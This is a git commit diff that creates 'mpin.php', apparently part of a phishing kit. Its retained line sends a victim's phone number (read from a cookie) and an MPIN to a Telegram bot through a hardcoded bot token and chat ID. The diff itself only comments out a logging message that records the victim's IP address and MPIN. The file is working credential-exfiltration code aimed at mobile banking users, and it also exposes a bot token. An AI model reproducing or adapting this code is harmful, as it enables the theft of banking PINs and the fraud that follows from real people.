62d491103f22c07713d62d8f230f148ddf555efc
NonNomen404 <92431601+NonNomen404@users.noreply.github.com>
2021-11-17 14:10:29 +0000

    Create mpin.php

--- mpin.php
+++ mpin.php
@@ -1,6 +1,6 @@
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-578705759&text=" . $_COOKIE['number'] . " MPIN: " . $nummpin);
 
-$replyMsg = " Logged [ $ip ] \n MPIN: $mpin";
+//$replyMsg = " Logged [ $ip ] \n MPIN: $mpin";
 
 $replyMsg = "\n";
 // other
